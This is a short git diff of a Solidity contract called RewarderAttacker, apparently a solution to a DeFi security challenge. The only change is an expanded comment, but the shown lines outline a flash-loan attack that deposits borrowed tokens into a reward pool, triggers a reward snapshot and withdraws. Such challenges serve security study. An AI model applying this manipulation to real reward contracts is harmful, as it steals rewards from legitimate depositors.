@@ -33,7 +33,7 @@ contract RewarderAttacker {
         SafeTransferLib.safeApprove(liquidityToken, address(rewarderPool), loanAmount);
         rewarderPool.deposit(loanAmount);
 
-        // Call distributeRewards to claim the rewards
+        // Call distributeRewards to claim the rewards. This will create a snapshot of the reward pool
         rewarderPool.distributeRewards();
 
         // Withdraw the flash loan from the reward pool
